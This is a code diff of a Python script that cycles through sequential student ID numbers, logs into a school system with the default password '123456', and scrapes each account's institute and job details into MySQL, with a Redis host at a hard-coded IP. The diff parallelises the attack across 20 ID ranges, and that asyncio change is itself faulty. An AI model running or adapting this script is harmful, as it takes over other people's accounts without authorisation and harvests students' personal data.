@@ -1,14 +1,14 @@
-import threading
+import asyncio
 import time
 import MySQLdb
 import requests
 import redis
 import re
 
-base_number = 12015050101001
 invalid = 0
-user_name = ''
-pass_word = 123456
+loop = 12015050101001
+
+pass_word = '123456'
 
 redis_info = {
     'host': '119.23.214.123',
@@ -90,7 +90,7 @@ class DbRedis():
     hash类型，{'name':{'key':'value'}} redis操作
     """
 
-    def setHashRedis(self, name, key, value):
+    async def setHashRedis(self, name, key, value):
         res = self.conn.hset(name, key, value)
         return res
 
@@ -110,7 +110,6 @@ class DbRedis():
         return res
 
 
-
 def get_job(text: str):
     job = re.search(r'name=\"yxdw1\" value=\"(.*?)\"', text).group()
     job = str.replace(job, 'name="yxdw1" value="', '')
@@ -128,13 +127,10 @@ def get_institute(text: str):
 
 def save_db(institute, job):
     global invalid
-    global base_number
     # dbredis = DbRedis()
-    invalid += 1
     # dbredis.setHashRedis(str(invalid), 'institute', institute)
     # dbredis.setHashRedis(str(invalid), 'job', job)
     DbMysql.Insert(invalid, institute, job)
-    base_number+=1
     print('save access', invalid)
 
 
@@ -142,7 +138,6 @@ def parse_html(text: str):
     job = get_job(text)
     institute = get_institute(text)
     save_db(institute, job)
-
 
 
 def ispwd(html):
@@ -158,7 +153,7 @@ def isexist(html: str):
         return True
 
 
-def iserror(html:str):
+def iserror(html: str):
     if re.search(r'系统错误', html) is not None:
         return False
     else:
@@ -173,46 +168,46 @@ def iserror(html:str):
 # 031 学号
 ###############################
 
+def start(loop):
+    loop_end=loop+100000
+    n = 0
+    while loop<loop_end:
 
-def start():
-    while True:
-        global base_number
-        data = {'user_name': base_number, 'pass_word': pass_word}
+        user_name = loop
+        data = {'user_name': user_name, 'pass_word': pass_word}
         requests.adapters.DEFAULT_RETRIES = 5  # 增加重连次数
         try:
             session = requests.sessions.session()
             session.keep_alive = False
             session.get(login_url)  # get login of cookie
             res = session.request("POST", login_url, data=data, headers=headers)
-            if ispwd(res.text) is not True:
-                base_number+=1
+            if  ispwd(res.text) is not True:
+                loop += 1
                 continue
-            if isexist(res.text) is True:
-                print(base_number, '.....................')
+            if  isexist(res.text) is True:
+                print(loop, '.....................')
                 res = session.request("GET", msg_url, headers=headers)
-                if iserror(res.text) is True:
+                if  iserror(res.text) is True:
                     parse_html(res.text)
-                    base_number += 1
+                    loop += 1
+                    n += 1
                     continue
+                elif n==0:
+                    return
                 else:
-                    print('not find number1', base_number)
-                    base_number -= base_number % 10000
-                    base_number+=1
-                    base_number += 100000
+                    loop=loop-loop%1000
+                    loop += 1001
+            elif n == 0:
+                return
             else:
-                print('not find number 2', base_number)
-                if base_number % 1000 == 1:
-                    base_number += 101000
-                    continue
-                else:
-                    if base_number%1000+1000>10000:
-                        base_number -= base_number % 10000
-                        base_number += 10001
-                    else:
-                        base_number -= base_number % 1000
-                        base_number += 1001
-                    continue
-        except:
+                n+=1
+                loop+=1
+                if n>10:
+                    n=0
+                    loop=loop-loop%1000
+                    loop+=1001
+
+        except  :
             print("timeout ....")
             time.sleep(2)
             continue
@@ -223,5 +218,9 @@ def end():
 
 
 if __name__ == '__main__':
-    start()
+    loops = asyncio.get_event_loop()
+    coroutines = [start(12015050101001 + i*100000) for i in range(20)]
+    tasks = [asyncio.ensure_future(coroutine) for coroutine in coroutines]
+    loops.run_until_complete(asyncio.wait(tasks))
+    loops.close()
     end()
